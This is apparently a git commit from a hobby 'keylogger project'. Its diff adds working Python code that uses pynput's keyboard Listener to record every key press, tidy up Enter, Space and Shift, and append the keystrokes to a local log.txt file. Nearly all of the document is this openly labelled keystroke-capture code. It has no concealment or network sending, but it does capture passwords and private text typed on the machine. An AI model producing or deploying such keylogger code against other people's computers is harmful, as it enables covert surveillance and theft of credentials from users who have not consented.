513cd720104305b1148a14532e15be1ce9a2d964
Ajay Singh Rana <ajaysinghrana494@gmail.com>
2020-04-16 22:40:12 +0530

    Add listening and logging capabilities
    The basic capabilities of a key logger i.e. listening to key strokes and
    logging them into a file were added using Listener class from pynput
    module and basic file handling operations.
    
    Few modifier keys like Space,Enter and Shift were handeled.

--- main.py
+++ main.py
@@ -1,6 +1,22 @@
 # H3avren@py
-
 # A keylogger project
 
-with open("log.txt","w") as fileHead:
-    fileHead.write("Hey! It's Heavren. Reloaded...")
+from pynput.keyboard import Listener
+
+def write_to_file(key):
+    letter= str(key).replace("'","")
+    if(letter=="Key.enter"):
+        letter = "\n"
+    elif(letter=="Key.space"):
+        letter = " "
+    elif(letter.find("Key.shift")!= -1):
+        if(letter.find("Key.shift_r")!= -1):
+            letter = letter.replace("Key.shift_r","")
+        else:
+            letter = letter.replace("Key.shift","")
+    with open("log.txt","a") as fileHead:
+        fileHead.write(letter)
+
+
+with Listener(on_press = write_to_file) as listeningHead:
+    listeningHead.join()
